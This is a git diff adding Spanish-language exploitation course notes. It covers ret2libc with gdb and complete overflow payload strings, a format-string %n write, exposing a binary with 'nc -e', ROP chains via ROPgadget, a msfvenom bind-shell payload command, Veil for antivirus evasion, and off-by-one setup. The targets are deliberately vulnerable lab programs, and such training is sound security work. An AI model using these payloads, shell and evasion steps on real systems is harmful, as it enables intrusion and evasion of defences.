@@ -134,3 +134,108 @@ descomprimirlo, ejecutar el configure, si falla instalar dependencias (build-ess
 
 modificar linea en Makefile:
 CC = gcc -fno-stack-protector -D_FORTIFY_SOURCE=0 -z norelro -z execstack
+
+
+================================== Dia 5 ==================================
+
+
+|           buffer            | -> empieza frame de la función
+|           ebp               |
+|           eip               |
+| args de la función a llamar |
+
+
+
+
+ret2libc -> WAX 
+
+https://pastebin.com/bFHeMEXv -> ejemplo
+gcc ret2libc.c -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -> lo compilamos así
+
+--> Primero obtienes la dirección de system
+(gdb) p &system -> muestra la dir de la función system
+
+---> Después checas el ret de la función "imprime", esto solo para poner un breackpoint
+(gdb) disas *imprime -> muestra la función imprime, ponemos un break en donde esta el ret de imprime
+
+---> Probamos igual que los anteriores el número hasta sobreescribir ebp
+r `python -c "print 'A' * 128 + 'B' * 4"`
+
+---> Una vez teniendo estos números, lo siguiente será poner la dirección de system como siguientes 4 bytes, recordando que se introduce en little endian
+* nos transladamos a la dirección de system para hacer el ataque
+r `python -c "print 'A' * 128 + 'B' * 4 + '\xe0\xf3\xe5\xf7'"`
+
+---> Buscamos en memoria la dirección de lib.c 
+(gdb) i proc map
+---> buscamos la dir de la cadena /bin/sh, ponemos la primera dir de la primera línea y la última dir de la última línea donde aparezca libc
+(gdb) find baja, alta, "/bin/sh" -> sintaxis
+(gdb) find 0xf7e21000, 0xf7ffe000, "/bin/sh" ----> 0xf7f80551
+
+---> por último hacemos el ataque, poniendo 4 bytes siguientes como basura para el eip y posteriormente la cadena /bin/sh para que esa sea el argumento de la función system
+r `python -c "print 'A' * 128 + 'B' * 4 + '\xe0\xf3\xe5\xf7' + 'XXXX' + '\x51\x05\xf8\xf7'"`
+
+---> lo que queda, solo para terminar el programa exitosamente, es cambiar la "basura" por la dir de la función exit
+p &exit -> obtenemos esa dirección
+r `python -c "print 'A' * 128 + 'B' * 4 + '\xe0\xf3\xe5\xf7' + '\xb0\x21\xe5\xf7' + '\x51\x05\xf8\xf7'"`
+
+---> para ejecutarlo sin gdb
+./ret2 `python -c "print 'A' * 128 + 'B' * 4 + '\xe0\xf3\xe5\xf7' + '\xb0\x21\xe5\xf7' + '\x51\x05\xf8\xf7'"`
+
+******* Format string ******
+
+https://pastebin.com/X6GDFkDH
+gcc format_string.c -o forstr -m32
+
+python -c "print 'AAAA' + '%x, ' * 6" | ./forstr
+
+---> obtenemos la dirección de la variable "secret"
+(gdb) i variables
+0x5655702c -> secret
+
+**** Nota: 
+printf("%2$, 3, 4, 5) -> $ es el argumento, con el 2 indicamos que imprima el segundo argumento
+printf("1234%n", var) -> n indica que guarde en la variable en número de caracteres que tiene antes de él
+****
+---> checamos que sobreescribe la variable secret, ahora solo sería aumentarle uno
+python -c 'print "\x2c\x70\x55\x56%187x%4$n"' | ./forstr
+
+---> como hay problemas, primero debe levantarse un puerto
+nc -e ./forstr -lvp 6969
+
+---> posteriormente conectarte a ese puerto
+(python -c 'print "\x2c\x70\x55\x56%187x%4$n"'; cat) | nc <ip> <puerto>
+
+************* ROP ************* 
+
+https://pastebin.com/uTLxis7W -> descagar el ftp_server, immunitydebugger, xpISO
+https://pastebin.com/KN4238Vi
+
+windows xp serial sp1 -> googlear para el iso xp
+
+ROP -> return oriented programming
+gadget -> 
+ropchain -> cadena de rops, 
+
+gcc rop.c -o rop_dyn -fno-stack-protector -m32
+gcc rop.c -o rop -static -fno-stack-protector -m32
+
+./ROPgadget/ROPgadget.py --ropchain --binary rop -> del estatico
+
+
+================================== Dia 6 ================================== 
+
+
+*pedir apuntes*
+
+
+msfvenom --list payload
+msfvenom -p windows/shell_bind_tcp -b '\x00\x0A\x0d' -f python
+
+veilframework -> para evadir soluciones de antivirus
+
+
+****** off_by_one
+
+https://pastebin.com/xBKbvyx8
+gcc -fno-pie -mpreferred-stack-boundary=2 -m32 -zexecstack -ggdb -fno-stack-protector off_by_one.c -o off
+
